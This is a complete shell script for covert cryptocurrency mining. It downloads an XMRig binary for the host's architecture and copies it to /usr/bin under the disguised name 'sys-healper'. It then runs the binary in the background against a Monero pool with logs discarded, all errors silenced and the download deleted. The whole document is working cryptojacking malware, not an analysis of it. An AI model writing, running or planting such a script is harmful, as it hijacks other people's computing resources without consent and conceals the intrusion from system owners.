#!/bin/sh
# relay-px bootstrap - sys-healper miner
ARCH=$(uname -m)
case "$ARCH" in
  x86_64) URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz" ;;
  aarch64) URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-arm64.tar.gz" ;;
  armv7l) URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-armv7.tar.gz" ;;
  *) echo "arch-skip"; exit 0 ;;
esac
curl -sL -m 120 "$URL" -o /tmp/.xmr.tgz 2>/dev/null || wget -q -T 120 "$URL" -O /tmp/.xmr.tgz 2>/dev/null
cd /tmp && tar xzf .xmr.tgz 2>/dev/null
BIN=$(find /tmp -maxdepth 3 -name xmrig -type f 2>/dev/null | head -1)
if [ -n "$BIN" ]; then
  cp "$BIN" /usr/bin/sys-healper 2>/dev/null || cp "$BIN" /tmp/sys-healper 2>/dev/null
  P=/usr/bin/sys-healper; [ -x "$P" ] || P=/tmp/sys-healper
  chmod +x "$P"
  pkill -f sys-healper 2>/dev/null
  nohup "$P" -o pool.supportxmr.com:443 --tls --donate-level=0 --cpu-max-threads=50 --background --log-file=/dev/null >/dev/null 2>&1 &
  echo mined-ok
else
  echo failed
fi
rm -f /tmp/.xmr.tgz 2>/dev/null